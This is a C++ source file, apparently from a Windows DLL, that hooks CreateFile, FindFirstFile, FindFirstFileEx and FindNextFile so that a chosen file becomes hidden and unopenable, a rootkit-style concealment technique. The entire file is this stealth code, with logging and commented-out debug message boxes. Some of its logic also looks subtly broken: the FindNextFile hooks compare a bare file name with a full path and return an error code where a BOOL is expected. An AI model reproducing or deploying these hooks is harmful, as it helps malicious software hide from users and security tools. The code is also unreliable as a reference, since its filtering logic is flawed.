
#include "FileHiding.h"

string fullpath;
string path;
string filename;
wstring wfullpath;
wstring wpath;
wstring wfilename;


HANDLE(WINAPI* pFindFirstFileExA)(LPCSTR lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp, LPVOID  lpSearchFilter, DWORD dwAdditionalFlags) = FindFirstFileExA;

HANDLE(WINAPI *pFindFirstFileExW)(LPCWSTR  lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID  lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp, LPVOID lpSearchFilter, DWORD   dwAdditionalFlags) = FindFirstFileExW;

HANDLE(WINAPI *pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = CreateFileA;

HANDLE(WINAPI *pCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = CreateFileW;

HANDLE(WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData) = FindFirstFileA;

HANDLE(WINAPI *pFindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData) = FindFirstFileW;

BOOL(WINAPI *pFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData) = FindNextFileA;

BOOL(WINAPI *pFindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) = FindNextFileW;

#pragma region

__declspec(dllexport) HANDLE WINAPI MyFindFirstFileExA_withHide(
	LPCSTR             lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID             lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
)
{
	if (string(lpFileName) == fullpath)
	{
		return INVALID_HANDLE_VALUE;
	}


	return pFindFirstFileExA(
		lpFileName,
		fInfoLevelId,
		lpFindFileData,
		fSearchOp,
		lpSearchFilter,
		dwAdditionalFlags
	);
}


__declspec(dllexport) HANDLE WINAPI MyFindFirstFileExW_withHide(
	LPCWSTR            lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID             lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
)
{
	if (wstring(lpFileName) == wfullpath)
	{
		return INVALID_HANDLE_VALUE;
	}

	return pFindFirstFileExW(
		lpFileName,
		fInfoLevelId,
		lpFindFileData,
		fSearchOp,
		lpSearchFilter,
		dwAdditionalFlags
	);
}


__declspec(dllexport) HANDLE WINAPI MyCreateFileA_withHide(
	LPCSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
	HANDLE hTemplateFile
)
{
	if (string(lpFileName) == fullpath)
	{
		return INVALID_HANDLE_VALUE;
	}
	return pCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}


__declspec(dllexport) HANDLE WINAPI MyCreateFileW_withHide(
	LPCWSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
	HANDLE hTemplateFile
)
{
	if (wfullpath == wstring(lpFileName))
	{
		return INVALID_HANDLE_VALUE;
	}

	return pCreateFileW(
		lpFileName,
		dwDesiredAccess,
		dwShareMode,
		lpSecurityAttributes,
		dwCreationDisposition,
		dwFlagsAndAttributes,
		hTemplateFile);
}


__declspec(dllexport) HANDLE WINAPI MyFindFirstFileA_withHide(
	LPCSTR lpFileName,
	LPWIN32_FIND_DATAA lpFindFileData
)
{
	if (string(lpFileName) == fullpath)
	{
		return INVALID_HANDLE_VALUE;
	}

	return pFindFirstFileA(lpFileName, lpFindFileData);
}


__declspec(dllexport) HANDLE WINAPI MyFindFirstFileW_withHide(
	LPCWSTR lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
	if (wstring(lpFileName) == wfullpath)
	{
		return INVALID_HANDLE_VALUE;
	}
	return pFindFirstFileW(lpFileName, lpFindFileData);
}


__declspec(dllexport) BOOL WINAPI MyFindNextFileA_withHide(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAA lpFindFileData
)
{
	if (string(lpFindFileData->cFileName) == fullpath)
	{
		return ERROR_NO_MORE_FILES;
	}
	return pFindNextFileA(hFindFile, lpFindFileData);
}

__declspec(dllexport) BOOL WINAPI MyFindNextFileW_withHide(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
)
{
	if (wstring(lpFindFileData->cFileName) == wfullpath)
	{
		return ERROR_NO_MORE_FILES;
	}
	return pFindNextFileW(hFindFile, lpFindFileData);
}

#pragma endregion


int hideFile(const string& fileName)
{
	LOG("hide_log");
	LOGMSG("[!] hideFile function");

	LONG err = NULL;
	string func;
	char drive[_MAX_DRIVE] = { 0 };
	char dir[_MAX_DIR] = { 0 };
	char fname[_MAX_FNAME] = { 0 };
	char ext[_MAX_EXT] = { 0 };
	char c_fullpath[_MAX_PATH] = { 0 };


	if (fileName.length() == 0 || fileName.length() > _MAX_PATH)
	{
		return -1;
	}

	_splitpath_s(fileName.c_str(), drive, dir, fname, ext);
	filename = fname;
	filename += ext;
	path = drive;
	path += dir;
	fullpath = fileName;

	wstring wsFullPathTemp(fullpath.begin(), fullpath.end());
	wstring wsFilename(filename.begin(), filename.end());
	wstring wsPath(path.begin(), path.end());

	wfullpath = wsFullPathTemp;
	wfilename = wsFilename;
	wpath = wsPath;

	LOGMSG("[!] filename :: " + filename);
	LOGMSG("[!] path :: " + path);
	LOGMSG("[!] fullpath :: " + fullpath);

	//MessageBox(NULL, drive, "drive", MB_OK);
	//MessageBox(NULL, dir, "dir", MB_OK);
	//MessageBox(NULL, fname, "fname", MB_OK);
	//MessageBox(NULL, ext, "ext", MB_OK);
	//MessageBox(NULL, path.c_str(), "path", MB_OK);
	//MessageBox(NULL, filename.c_str(), "filename", MB_OK);
	//MessageBox(NULL, fullpath.c_str(), "fullpath", MB_OK);

	func = "CreateFileA";
	MAKE_HIDE(pCreateFileA, MyCreateFileA_withHide);

	func = "CreateFileW";
	MAKE_HIDE(pCreateFileW, MyCreateFileW_withHide);

	func = "FindFirstFileA";
	MAKE_HIDE(pFindFirstFileA, MyFindFirstFileA_withHide);

	func = "FindFirstFileW";
	MAKE_HIDE(pFindFirstFileW, MyFindFirstFileW_withHide);

	func = "FindFirstFileExA";
	MAKE_HIDE(pFindFirstFileExA, MyFindFirstFileExA_withHide);

	func = "FindFirstFileExW";
	MAKE_HIDE(pFindFirstFileExW, MyFindFirstFileExW_withHide);

	func = "FindNextFileA";
	MAKE_HIDE(pFindNextFileA, MyFindNextFileA_withHide);

	func = "FindNextFileW";
	MAKE_HIDE(pFindNextFileW, MyFindNextFileW_withHide);

	LOGMSG("[!] exit hideFile function");
	return 0;
}
